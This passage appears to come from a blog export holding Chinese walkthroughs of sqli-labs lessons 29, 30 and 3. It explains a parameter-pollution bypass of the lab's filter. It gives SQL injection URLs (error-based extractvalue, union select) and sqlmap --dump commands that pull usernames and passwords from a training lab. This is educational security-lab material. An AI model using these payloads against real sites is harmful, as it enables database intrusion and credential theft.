class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">java_implimentation</span><span class=\"params\">($query_string)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t$q_s = $query_string;</span><br><span class=\"line\">\t$qs_array= explode(<span class=\"string\">\"&amp;\"</span>,$q_s);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">foreach</span>($qs_array <span class=\"keyword\">as</span> $key =&gt; $value)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t$val=substr($value,<span class=\"number\">0</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>($val==<span class=\"string\">\"id\"</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t$id_value=substr($value,<span class=\"number\">3</span>,<span class=\"number\">30</span>); </span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> $id_value;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">whitelist</span><span class=\"params\">($input)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t$match = preg_match(<span class=\"string\">\"/^\\d+$/\"</span>, $input);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>($match)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//echo \"you are good\";</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//return $match;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;\t</span><br><span class=\"line\">\t\theader(<span class=\"string\">'Location: hacked.php'</span>);</span><br><span class=\"line\">\t\t<span class=\"comment\">//echo \"you are bad\";</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>java_implimentation通过explode将url中传递的参数以&amp;分割保存在数组中，随后查找id和id的内容。whitelist检查id的值是否是纯数字。不符合规范跳转错误界面。</p>\n<p><img src=\"/img/sql/Lesson-29/003.png\" alt=\"003\"></p>\n<p>但是通过这个例子发现有重复参数的时候它没有检查。&amp;是传参中用来多个参数传递的。就有了下面的绕过方法。</p>\n<p><img src=\"/img/sql/Lesson-29/004.png\" alt=\"004\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p><code>http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&#39; order by 4%23</code></p>\n<p><img src=\"/img/sql/Lesson-29/005.png\" alt=\"005\"></p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&#39; and extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-29/006.png\" alt=\"006\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&#39; and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-29/007.png\" alt=\"007\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&#39; and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-29/008.png\" alt=\"008\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&#39; and extractvalue(null,concat(0x7e,(select concat(username,&#39;~&#39;,password) from security.users limit 1,1),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-29/009.png\" alt=\"009\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"deletion\">--technique E:检查报错注入方式</span></span><br><span class=\"line\"><span class=\"deletion\">--threads 10：并发线程数为10</span></span><br><span class=\"line\"><span class=\"deletion\">--flush-session:刷新session</span></span><br><span class=\"line\"><span class=\"deletion\">--fresh-queries:发起新查询</span></span><br><span class=\"line\"><span class=\"deletion\">-v 3：显示测试过程</span></span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -u &quot;http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&quot; --dbms mysql --technique E --threads 10 --flush-session --fresh-queries -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-29/010.png\" alt=\"010\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&quot; --dbms mysql --technique E --threads 10 --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-29/011.png\" alt=\"011\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&quot; --dbms mysql --technique E --threads 10 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-29/012.png\" alt=\"012\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-29-GET基于错误-阻抗不匹配-有WAF的web应用\"><a href=\"#sqli-labs-lession-29-GET基于错误-阻抗不匹配-有WAF的web应用\" class=\"headerlink\" title=\"sqli-labs lession 29 GET基于错误-阻抗不匹配-有WAF的web应用\"></a>sqli-labs lession 29 GET基于错误-阻抗不匹配-有WAF的web应用</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-29/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>这一课真正的登录界面是在login.php里,跟index.php的区别是进行了过滤。</p>\n<p>login.php中接受参数依次通过了自定义函数java_implimentation和whitelist过滤。</p>\n<p><img src=\"/img/sql/Lesson-29/002.png\" alt=\"002\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">java_implimentation</span><span class=\"params\">($query_string)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t$q_s = $query_string;</span><br><span class=\"line\">\t$qs_array= explode(<span class=\"string\">\"&amp;\"</span>,$q_s);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">foreach</span>($qs_array <span class=\"keyword\">as</span> $key =&gt; $value)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t$val=substr($value,<span class=\"number\">0</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>($val==<span class=\"string\">\"id\"</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t$id_value=substr($value,<span class=\"number\">3</span>,<span class=\"number\">30</span>); </span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> $id_value;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">whitelist</span><span class=\"params\">($input)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t$match = preg_match(<span class=\"string\">\"/^\\d+$/\"</span>, $input);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>($match)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//echo \"you are good\";</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//return $match;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;\t</span><br><span class=\"line\">\t\theader(<span class=\"string\">'Location: hacked.php'</span>);</span><br><span class=\"line\">\t\t<span class=\"comment\">//echo \"you are bad\";</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>java_implimentation通过explode将url中传递的参数以&amp;分割保存在数组中，随后查找id和id的内容。whitelist检查id的值是否是纯数字。不符合规范跳转错误界面。</p>\n<p><img src=\"/img/sql/Lesson-29/003.png\" alt=\"003\"></p>\n<p>但是通过这个例子发现有重复参数的时候它没有检查。&amp;是传参中用来多个参数传递的。就有了下面的绕过方法。</p>\n<p><img src=\"/img/sql/Lesson-29/004.png\" alt=\"004\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p><code>http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&#39; order by 4%23</code></p>\n<p><img src=\"/img/sql/Lesson-29/005.png\" alt=\"005\"></p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&#39; and extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-29/006.png\" alt=\"006\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&#39; and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-29/007.png\" alt=\"007\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&#39; and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-29/008.png\" alt=\"008\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&#39; and extractvalue(null,concat(0x7e,(select concat(username,&#39;~&#39;,password) from security.users limit 1,1),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-29/009.png\" alt=\"009\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"deletion\">--technique E:检查报错注入方式</span></span><br><span class=\"line\"><span class=\"deletion\">--threads 10：并发线程数为10</span></span><br><span class=\"line\"><span class=\"deletion\">--flush-session:刷新session</span></span><br><span class=\"line\"><span class=\"deletion\">--fresh-queries:发起新查询</span></span><br><span class=\"line\"><span class=\"deletion\">-v 3：显示测试过程</span></span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -u &quot;http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&quot; --dbms mysql --technique E --threads 10 --flush-session --fresh-queries -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-29/010.png\" alt=\"010\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&quot; --dbms mysql --technique E --threads 10 --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-29/011.png\" alt=\"011\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.133/sql/Less-29/login.php?id=1&amp;id=2&quot; --dbms mysql --technique E --threads 10 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-29/012.png\" alt=\"012\"></p>\n"},{"title":"sqli-labs lession-3 基于错误的GET单引号变形注入","date":"2018-09-19T12:02:15.000Z","_content":"\n# sqli-labs lession-3 (基于错误的GET单引号变形注入) #\n\n---\n\n## 登录界面 ##\n\n![1](https://i.imgur.com/7J97H2J.png)\n\n## 注入过程 ##\n\n`http://10.60.250.214/less/Less-3/?id=1 and 1=2`\n\n页面无变化,排除整型注入\n\n![2](https://i.imgur.com/C7Q76OS.png)\n\n`http://10.60.250.214/less/Less-3/?id=1'`\n\n![3](https://i.imgur.com/550bpkp.png)\n\n返回报错信息:\n\n`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1`\n\n这条报错信息与Lesson1的报错信息对比\n\nLesson1:\n\n`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`\n\n发现现在这条报错信息多了一个`)`\n\n应该是但引号的变形。猜测源码中SQL语句:\n\n`$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";`\n\n测试一下\n\n`http://10.60.250.214/less/Less-3/?id=1%27)%20order%20by%20100%23`\n\n![4](https://i.imgur.com/K8K2dSA.png)\n\n成功！！！\n\n剩下的操作与Lesson1和Lesson2没有什么不同了。\n\n具体流程可以查看这里。\n\n{% post_link sqli-labs-lession-1-基于错误的GET单引号字符型注入 点击查看Lesson-1 %}\n","source":"_posts/sqli-labs-lession-3-基于错误的GET单引号变形注入.md","raw":"---\ntitle: sqli-labs lession-3 基于错误的GET单引号变形注入\ndate: 2018-09-19 20:02:15\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-3 (基于错误的GET单引号变形注入) #\n\n---\n\n## 登录界面 ##\n\n![1](https://i.imgur.com/7J97H2J.png)\n\n## 注入过程 ##\n\n`http://10.60.250.214/less/Less-3/?id=1 and 1=2`\n\n页面无变化,排除整型注入\n\n![2](https://i.imgur.com/C7Q76OS.png)\n\n`http://10.60.250.214/less/Less-3/?id=1'`\n\n![3](https://i.imgur.com/550bpkp.png)\n\n返回报错信息:\n\n`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1`\n\n这条报错信息与Lesson1的报错信息对比\n\nLesson1:\n\n`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`\n\n发现现在这条报错信息多了一个`)`\n\n应该是但引号的变形。猜测源码中SQL语句:\n\n`$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";`\n\n测试一下\n\n`http://10.60.250.214/less/Less-3/?id=1%27)%20order%20by%20100%23`\n\n![4](https://i.imgur.com/K8K2dSA.png)\n\n成功！！！\n\n剩下的操作与Lesson1和Lesson2没有什么不同了。\n\n具体流程可以查看这里。\n\n{% post_link sqli-labs-lession-1-基于错误的GET单引号字符型注入 点击查看Lesson-1 %}\n","slug":"sqli-labs-lession-3-基于错误的GET单引号变形注入","published":1,"updated":"2019-06-19T17:23:13.390Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istdv003w4dsbtksyg9sh","content":"<h1 id=\"sqli-labs-lession-3-基于错误的GET单引号变形注入\"><a href=\"#sqli-labs-lession-3-基于错误的GET单引号变形注入\" class=\"headerlink\" title=\"sqli-labs lession-3 (基于错误的GET单引号变形注入)\"></a>sqli-labs lession-3 (基于错误的GET单引号变形注入)</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"https://i.imgur.com/7J97H2J.png\" alt=\"1\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><p><code>http://10.60.250.214/less/Less-3/?id=1 and 1=2</code></p>\n<p>页面无变化,排除整型注入</p>\n<p><img src=\"https://i.imgur.com/C7Q76OS.png\" alt=\"2\"></p>\n<p><code>http://10.60.250.214/less/Less-3/?id=1&#39;</code></p>\n<p><img src=\"https://i.imgur.com/550bpkp.png\" alt=\"3\"></p>\n<p>返回报错信息:</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code></p>\n<p>这条报错信息与Lesson1的报错信息对比</p>\n<p>Lesson1:</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>\n<p>发现现在这条报错信息多了一个<code>)</code></p>\n<p>应该是但引号的变形。猜测源码中SQL语句:</p>\n<p><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p>\n<p>测试一下</p>\n<p><code>http://10.60.250.214/less/Less-3/?id=1%27)%20order%20by%20100%23</code></p>\n<p><img src=\"https://i.imgur.com/K8K2dSA.png\" alt=\"4\"></p>\n<p>成功！！！</p>\n<p>剩下的操作与Lesson1和Lesson2没有什么不同了。</p>\n<p>具体流程可以查看这里。</p>\n<a href=\"/2018/09/18/sqli-labs-lession-1-基于错误的GET单引号字符型注入/\" title=\"点击查看Lesson-1\">点击查看Lesson-1</a>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-3-基于错误的GET单引号变形注入\"><a href=\"#sqli-labs-lession-3-基于错误的GET单引号变形注入\" class=\"headerlink\" title=\"sqli-labs lession-3 (基于错误的GET单引号变形注入)\"></a>sqli-labs lession-3 (基于错误的GET单引号变形注入)</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"https://i.imgur.com/7J97H2J.png\" alt=\"1\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><p><code>http://10.60.250.214/less/Less-3/?id=1 and 1=2</code></p>\n<p>页面无变化,排除整型注入</p>\n<p><img src=\"https://i.imgur.com/C7Q76OS.png\" alt=\"2\"></p>\n<p><code>http://10.60.250.214/less/Less-3/?id=1&#39;</code></p>\n<p><img src=\"https://i.imgur.com/550bpkp.png\" alt=\"3\"></p>\n<p>返回报错信息:</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code></p>\n<p>这条报错信息与Lesson1的报错信息对比</p>\n<p>Lesson1:</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>\n<p>发现现在这条报错信息多了一个<code>)</code></p>\n<p>应该是但引号的变形。猜测源码中SQL语句:</p>\n<p><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p>\n<p>测试一下</p>\n<p><code>http://10.60.250.214/less/Less-3/?id=1%27)%20order%20by%20100%23</code></p>\n<p><img src=\"https://i.imgur.com/K8K2dSA.png\" alt=\"4\"></p>\n<p>成功！！！</p>\n<p>剩下的操作与Lesson1和Lesson2没有什么不同了。</p>\n<p>具体流程可以查看这里。</p>\n<a href=\"/2018/09/18/sqli-labs-lession-1-基于错误的GET单引号字符型注入/\" title=\"点击查看Lesson-1\">点击查看Lesson-1</a>\n"},{"title":"sqli-labs lession-30 GET基于盲注-阻抗不匹配-有WAF的web应用","date":"2018-10-14T08:31:10.000Z","_content":"\n# sqli-labs lession-30 GET基于盲注-阻抗不匹配-有WAF的web应用\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-30/001.png)\n\n## 分析\n\n真正有WAF的页面是login.php,根据题目来做的话要把这行代码注释掉,不使用报错。\n\n![002](/img/sql/Lesson-30/002.png)\n\n过滤都和Lesson-29一样,只是这里用双引号闭合，需要把显示账号密码注释后的再改改弄的像Lesson-8才是布尔型盲注。\n\n这里太麻烦了没弄。\n\n## 手注\n\n### 获取字段数\n\n`http://192.168.75.133/sql/Less-30/login.php?id=1&id=2\" order by 4%23`\n\n![003](/img/sql/Lesson-30/003.png)\n\n`http://192.168.75.133/sql/Less-30/login.php?id=1&id=2\" order by 4%23`\n\n![004](/img/sql/Lesson-30/004.png)\n\n### 获取数据库\n\n`http://192.168.75.133/sql/Less-30/login.php?id=1&id=-2\"union select 1,2,3%23`\n\n![005](/img/sql/Lesson-30/005.png)\n\n`http://192.168.75.133/sql/Less-30/login.php?id=1&id=-2\"union select 1,database(),3%23`\n\n![006](/img/sql/Lesson-30/006.png)\n\n### 获取表名\n\n`http://192.168.75.133/sql/Less-30/login.php?id=1&id=-2\"union select 1,(select group_concat(table_name)from information_schema.tables where table_schema='security'),3%23`\n\n![007](/img/sql/Lesson-30/007.png)\n\n### 获取列名\n\n`http://192.168.75.133/sql/Less-30/login.php?id=1&id=-2\"union select 1,(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users'),3%23`\n\n![008](/img/sql/Lesson-30/008.png)\n\n### 获取字段\n\n`http://192.168.75.133/sql/Less-30/login.php?id=1&id=-2\"union select 1,(select group_concat(username,'~',password) from security.users),3%23`\n\n![009](/img/sql/Lesson-30/009.png)\n\n## SQLMAP\n\n```\n--technique B:检查布尔型注入\n--dbms 10：后端数据库设置为mysql\n--flush-session:刷新session\n--fresh-queries:发起新查询\n-v 2：显示测试过程\n```\n\n`sqlmap -u \"http://192.168.75.133/sql/Less-30/login.php?id=1&id=2*\" --technique B --dbms mysql --level 2 -v 2`\n\n![010](/img/sql/Lesson-30/010.png)\n\n![011](/img/sql/Lesson-30/011.png)\n\n`sqlmap -u \"http://192.168.75.133/sql/Less-30/login.php?id=1&id=2*\" --technique B --dbms mysql --dbs --threads 10`\n\n![012](/img/sql/Lesson-30/012.png)\n\n`sqlmap -u \"http://192.168.75.133/sql/Less-30/login.php?id=1&id=2*\" --technique B mysql -D security --tables --threads 10`\n\n![013](/img/sql/Lesson-30/013.png)\n\n`sqlmap -u \"http://192.168.75.133/sql/Less-30/login.php?id=1&id=2*\" --technique B mysql -D security -T users --columns --dump --threads 10`\n\n![014](/img/sql/Lesson-30/014.png)","source":"_posts/sqli-labs-lession-30-GET基于盲注-阻抗不匹配-有WAF的web应用.md","raw":"---\ntitle: sqli-labs lession-30 GET基于盲注-阻抗不匹配-有WAF的web应用\ndate: 2018-10-14 16:31:10\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-30 GET基于盲注-阻抗不匹配-有WAF的web应用\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-30/001.png)\n\n## 分析\n\n真正有WAF的页面是login.php,根据题目来做的话要把这行代码注释掉,不使用报错。\n\n![002](/img/sql/Lesson-30/002.png)\n\n过滤都和Lesson-29一样,只是这里用双引号闭合，需要把显示账号密码注释后的再改改弄的像Lesson-8才是布尔型盲注。\n\n这里太麻烦了没弄。\n\n## 手注\n\n### 获取字段数\n\n`http://192.168.75.133/sql/Less-30/login.php?id=1&id=2\" order by 4%23`\n\n![003](/img/sql/Lesson-30/003.png)\n\n`http://192.168.75.133/sql/Less-30/login.php?id=1&id=2\" order by 4%23`\n\n![004](/img/sql/Lesson-30/004.png)\n\n### 获取数据库\n\n`http://192.168.75.133/sql/Less-30/login.php?id=1&id=-2\"union select 1,2,3%23`\n\n![005](/img/sql/Lesson-30/005.png)\n\n`http://192.168.75.133/sql/Less-30/login.php?id=1&id=-2\"union select 1,database(),3%23`\n\n![006](/img/sql/Lesson-30/006.png)\n\n### 获取表名\n\n`http://192.168.75.133/sql/Less-30/login.php?id=1&id=-2\"union select 1,(select group_concat(table_name)from information_schema.tables where table_schema='security'),3%23`\n\n![007](/img/sql/Lesson-30/007.png)\n\n### 获取列名\n\n`http://192.168.75.133/sql/Less-30/login.php?id=1&id=-2\"union select 1,(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users'),3%23`\n\n![008](/img/sql/Lesson-30/008.png)\n\n### 获取字段\n\n`http://192.168.75.133/sql/Less-30/login.php?id=1&id=-2\"union select 1,(select group_concat(username,'~',password) from security.users),3%23`\n\n![009](/img/sql/Lesson-30/009.png)\n\n## SQLMAP\n\n```\n--technique B:检查布尔型注入\n--dbms 10：后端数据库设置为mysql\n--flush-session:刷新session\n--fresh-queries:发起新查询\n-v 2：显示测试过程\n```\n\n`sqlmap -u \"http://192.168.75.133/sql/Less-30/login.php?id=1&id=2*\" --technique B --dbms mysql --level 2 -v 2`\n\n![010](/img/sql/Lesson-30/010.png)\n\n![011](/img/sql/Lesson-30/011.png)\n\n`sqlmap -u \"http://192.168.75.133/sql/Less-30/login.php?id=1&id=2*\" --technique B --dbms mysql --dbs --threads 10`\n\n![012](/img/sql/Lesson-30/012.png)\n\n`sqlmap -u \"http://192.168.75.133/sql/Less-30/login.php?id=1&id=2*\" --technique B mysql -D security --tables --threads 10`\n\n![013](/img/sql/Lesson-30/013.png)\n\n`sqlmap -u \"http://192.168.75.133/sql/Less-30/login.php?id=1&id=2*\" --technique B mysql -D security -T users --columns --dump --threads 10`\n\n![014](/img/sql/Lesson-30/014.png)","slug":"sqli-labs-lession-30-GET基于盲注-阻抗不匹配-有WAF的web应用","published":1,"updated":"2019-06-19T17:23:13.390Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istdx003y4dsbd02963ey","content":"<h1 id=\"sqli-labs-lession-30-GET基于盲注-阻抗不匹配-有WAF的web应用\"><a href=\"#sqli-labs-lession-30-GET基于盲注-阻抗不匹配-有WAF的web应用\" class=\"headerlink\" title=\"sqli-labs lession-30 GET基于盲注-阻抗不匹配-有WAF的web应用\"></a>sqli-labs lession-30 GET基于盲注-阻抗不匹配-有WAF的web应用</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-30/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>真正有WAF的页面是login.php,根据题目来做的话要把这行代码注释掉,不使用报错。</p>\n<p><img src=\"/img/sql/Lesson-30/002.png\" alt=\"002\"></p>\n<p>过滤都和Lesson-29一样,只是这里用双引号闭合，需要把显示账号密码注释后的再改改弄的像Lesson-8才是布尔型盲注。</p>\n<p>这里太麻烦了没弄。</p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p><code>http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=2&quot; order by 4%23</code></p>\n<p><img src=\"/img/sql/Lesson-30/003.png\" alt=\"003\"></p>\n<p><code>http://192.168.75.133/sql/Less-30/login.php?id=1&amp;id=2&quot; order by 4%23</code></p>\n<p><img src=\"/img/sql/Lesson-30/004.png\" alt=\"004\"></p>\n<h3 id=\"获取数据库\"><a href=\"#获取数据库\" 